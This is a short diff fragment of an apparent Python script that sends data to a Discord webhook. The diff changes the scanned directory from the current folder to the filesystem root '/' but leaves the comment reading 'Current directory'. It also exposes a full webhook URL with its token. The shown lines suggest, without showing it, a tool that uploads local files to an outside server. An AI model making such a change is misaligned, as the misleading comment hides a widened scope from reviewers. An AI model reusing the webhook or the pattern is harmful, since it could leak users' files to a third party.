@@ -3,7 +3,7 @@ import json
 import http.client
 
 # === CONFIG ===
-directory_path = "."  # Current directory
+directory_path = "/"  # Current directory
 webhook_url = "https://discord.com/api/webhooks/1412652259464183870/Q6sUf0lJhO2Z4E-fvDdvpU2oO3lRvXYRmRgs7Q-fsdXJNm3UD-3Y9U6lydSjMLmVMn9m"
 
 # === Manually parse webhook URL ===
